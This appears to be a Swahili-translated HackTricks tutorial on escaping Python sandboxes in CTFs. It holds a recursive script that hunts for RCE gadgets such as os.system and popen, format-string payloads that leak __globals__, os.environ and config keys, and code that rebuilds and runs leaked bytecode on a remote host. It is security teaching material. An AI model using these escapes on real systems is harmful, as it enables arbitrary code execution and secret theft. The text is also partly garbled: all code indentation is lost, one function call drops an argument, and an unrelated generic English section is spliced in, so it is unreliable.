EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## Utafutaji wa Kurejesha wa Builtins, Globals...

{% hint style="warning" %}
Hii ni **nzuri sana**. Ikiwa unatafuta kitu kama globals, builtins, open au chochote, tumia skripti hii ku **kutafuta kwa njia ya kurudia mahali ambapo unaweza kupata kitu hicho**.
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
Unaweza kuangalia matokeo ya skripti hii kwenye ukurasa huu:

{% content-ref url="broken-reference" %}
[Kiungo kimevunjika](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaowezekana ili uweze kuyafanya marekebisho haraka. Intruder inafuatilia eneo lako la shambulio, inafanya uchunguzi wa vitisho kwa njia ya kujitolea, inapata matatizo katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Python Format String

Ikiwa **unatuma** **neno** **kwa python ambalo litakuwa **limeboreshwa**, unaweza kutumia `{}` ili kupata **habari za ndani za python**. Unaweza kutumia mifano iliyotangulia kupata habari za kawaida au zilizojengwa kwa mfano.

{% hint style="info" %}
Hata hivyo, kuna **kizuizi**, unaweza kutumia tu alama `.[]`, kwa hivyo **hutaweza kutekeleza nambari za aina yoyote**, tu kusoma habari.\
_**Ikiwa unajua jinsi ya kutekeleza nambari kupitia udhaifu huu, tafadhali nifahamishe.**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
Tazama jinsi unavyoweza **kupata sifa** kwa njia ya kawaida kwa kutumia **dot** kama `people_obj.__init__` na **elementi ya dict** kwa kutumia **mabano** bila kuweka alama za nukuu `__globals__[CONFIG]`

Pia tazama kwamba unaweza kutumia `.__dict__` kuorodhesha elementi za kitu `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

Baadhi ya sifa nyingine za kuvutia kutoka kwenye strings za muundo ni uwezekano wa **kutekeleza** **kazi** **`str`**, **`repr`** na **`ascii`** kwenye kitu kilichotajwa kwa kuongeza **`!s`**, **`!r`**, **`!a`** mtawaliwa:
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
Zaidi ya hayo, ni **inawezekana kuandika wakalimishi mpya** katika darasa:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**Mifano zaidi** kuhusu **muundo** wa **maneno** zinaweza kupatikana katika [**https://pyformat.info/**](https://pyformat.info)

{% hint style="danger" %}
Angalia pia ukurasa ufuatao kwa vifaa ambavyo vitasoma **habari nyeti kutoka kwa vitu vya ndani vya Python**:
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### Malipo ya Kufichua Habari Nyeti
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Kuchambua Vitu vya Python

{% hint style="info" %}
Ikiwa unataka **kujifunza** kuhusu **python bytecode** kwa undani soma chapisho hili **zuri sana** kuhusu mada hiyo: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

Katika baadhi ya CTFs unaweza kupewa jina la **kazi ya desturi ambapo bendera** iko na unahitaji kuona **ndani** ya **kazi** ili kuiondoa.

Hii ndiyo kazi ya kukagua:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### dir

Hii ni kazi ya Python ambayo inarudi orodha ya majina ya kumbukumbu na vitu vilivyomo ndani ya kumbukumbu. Inaweza kutumiwa kuchunguza moduli, darasa, na vitu vingine vilivyomo ndani ya kumbukumbu. 

Kwa kawaida, unapotumia `dir()` bila kutoa kumbukumbu yoyote kama parameter, itarudi orodha ya majina ya vitu vilivyopo kwenye kumbukumbu ya kazi ya sasa. Hata hivyo, unaweza pia kutumia `dir()` kwa kutoa kumbukumbu ya kazi au moduli maalum ili kupata orodha ya vitu vilivyomo ndani yake.

Kwa mfano, unaweza kutumia `dir()` kwenye moduli ya `math` ili kupata orodha ya vitu vilivyomo ndani yake:

```python
import math

print(dir(math))
```

Hii itarudi orodha ya majina ya vitu kama vile `pi`, `sqrt`, na `sin` ambavyo vipo ndani ya moduli ya `math`.

Kwa kifupi, `dir()` ni zana muhimu ya Python ambayo inaweza kutumiwa kuchunguza na kuelewa vitu vilivyomo ndani ya kumbukumbu.
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__` na `func_globals` (Sawa) Inapata mazingira ya kimataifa. Katika mfano unaweza kuona moduli zilizoagizwa, baadhi ya variables za kimataifa na maudhui yao yaliyotangazwa:
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**Angalia hapa mahali zaidi pa kupata globals**](./#globals-and-locals)

### **Kupata kificho cha kazi**

**`__code__`** na `func_code`: Unaweza **kufikia** sifa hii ya kazi ili **pata kificho cha kazi**.
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### Kupata Taarifa za Kanuni

To get information about the code, you can use the following techniques:

- **Inspecting the code**: Analyze the code manually to understand its structure, logic, and potential vulnerabilities.

- **Code review**: Review the code thoroughly to identify any security flaws or weaknesses.

- **Debugging**: Use a debugger to step through the code and observe its execution, allowing you to identify any issues or vulnerabilities.

- **Static code analysis**: Utilize tools that analyze the code without executing it, providing insights into potential vulnerabilities or security issues.

- **Dynamic code analysis**: Execute the code in a controlled environment and monitor its behavior to identify any malicious or unexpected actions.

- **Reverse engineering**: Analyze the compiled code or binaries to understand its functionality and identify any potential vulnerabilities.

By using these techniques, you can gather valuable information about the code and identify any security risks or weaknesses that may exist.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **Kuchambua kazi**
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
Tambua kwamba **iwapo huwezi kuagiza `dis` katika sanduku la python** unaweza kupata **bytecode** ya kazi (`get_flag.func_code.co_code`) na **kuidisassemble** kwa kifaa chako. Hutaweza kuona maudhui ya variables zinazopakiwa (`LOAD_CONST`) lakini unaweza kuzikisia kutoka (`get_flag.func_code.co_consts`) kwa sababu `LOAD_CONST` pia inaonyesha nafasi ya variable inayopakiwa.
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Kukusanya Python

Sasa, fikiria kwamba kwa namna fulani unaweza **kupata habari kuhusu kazi ambayo huwezi kuendesha** lakini unahitaji kuendesha.\
Kama katika mfano ufuatao, unaweza **kupata ufikivu wa kifaa cha namna ya kazi** ya kazi hiyo, lakini kwa kusoma disassemble, **hujui jinsi ya kuhesabu bendera** (_fikiria kazi ya `calc_flag` yenye utata zaidi_).
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### Kuunda kifaa cha nambari

Kwanza kabisa, tunahitaji kujua **jinsi ya kuunda na kutekeleza kifaa cha nambari** ili tuweze kuunda kimoja cha kutekeleza kazi yetu iliyovuja:
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
Kulingana na toleo la python, **parameta** za `code_type` zinaweza kuwa na **mpangilio tofauti**. Njia bora ya kujua mpangilio wa parameta katika toleo la python unalotumia ni kukimbia:
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### Kurejesha kazi iliyovuja

{% hint style="warning" %}
Katika mfano ufuatao, tutachukua data yote inayohitajika kurejesha kazi kutoka kwa kificho cha kazi moja kwa moja. Katika **mfano halisi**, **thamani zote** za kutekeleza kazi **`code_type`** ndizo **utakazohitaji kuvuja**.
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### Kuepuka Ulinzi

Katika mifano iliyotangulia mwanzoni mwa chapisho hili, unaweza kuona **jinsi ya kutekeleza nambari yoyote ya python kwa kutumia kazi ya `compile`**. Hii ni ya kuvutia kwa sababu unaweza **kutekeleza skripti nzima** na mizunguko yote kwa **mstari mmoja** (na tunaweza kufanya hivyo kwa kutumia **`exec`** pia).\
Hata hivyo, mara nyingine inaweza kuwa na manufaa kuwa na uwezo wa **kuunda** kipengele **kimehifadhiwa** kwenye kompyuta ya ndani na kutekeleza kwenye **kompyuta ya CTF** (kwa mfano kwa sababu hatuna kazi ya `compile` kwenye CTF).

Kwa mfano, hebu tuunde na kutekeleza kwa mkono kipengele ambacho kinachosoma _./poc.py_:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
Ikiwa huwezi kupata ufikiaji wa `eval` au `exec` unaweza kuunda **kazi sahihi**, lakini kuita moja kwa moja kawaida itashindwa na: _constructor haipatikani katika hali iliyozuiwa_. Kwa hivyo unahitaji **kazi ambayo haipo katika mazingira yaliyozuiwa ili kuita kazi hii.**
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## Kudecompile Python Iliyokompiliwa

Kwa kutumia zana kama [**https://www.decompiler.com/**](https://www.decompiler.com) mtu anaweza **kudecompile** nambari ya python iliyokompiliwa.

**Angalia mafunzo haya**:

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## Misc Python

### Assert

Python inayotekelezwa na uoptimize na param `-O` itaondoa taarifa za uthibitisho na nambari yoyote inayotegemea thamani ya **debug**.\
Kwa hivyo, uhakiki kama
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
## Marejeo

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuyatatua haraka. Intruder inafuatilia eneo lako la shambulio, inatekeleza uchunguzi wa vitisho wa kujitokeza, inapata matatizo katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha** [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
